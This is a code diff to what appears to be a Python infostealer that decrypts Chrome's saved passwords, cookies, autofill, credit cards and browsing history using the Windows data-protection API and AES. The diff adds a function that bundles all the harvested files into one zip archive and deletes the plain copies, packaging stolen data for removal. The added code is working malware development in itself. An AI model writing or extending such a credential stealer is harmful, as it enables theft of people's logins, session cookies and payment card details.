@@ -3,6 +3,7 @@ import json
 import shutil
 import base64
 import sqlite3
+from zipfile import ZipFile
 from Cryptodome.Cipher import AES
 from win32crypt import CryptUnprotectData
 from datetime import datetime, timezone, timedelta
@@ -165,9 +166,19 @@ class Chrome:
             print(f"[!]Error: {e}")
 
 
+def compress():
+    files = ["passwords.txt", "cookies.txt", "autofill.txt", "credit_cards.txt", "search_history.txt", "web_history.txt"]
+    with ZipFile("chrome.zip", "w") as z:
+        for file in files:
+            z.write(file)
+    for file in files:
+        os.remove(file)
+
+
 if __name__ == "__main__":
     chrome = Chrome()
     chrome.passwords()
     chrome.cookies()
     chrome.history()
     chrome.web_data()
+    compress()
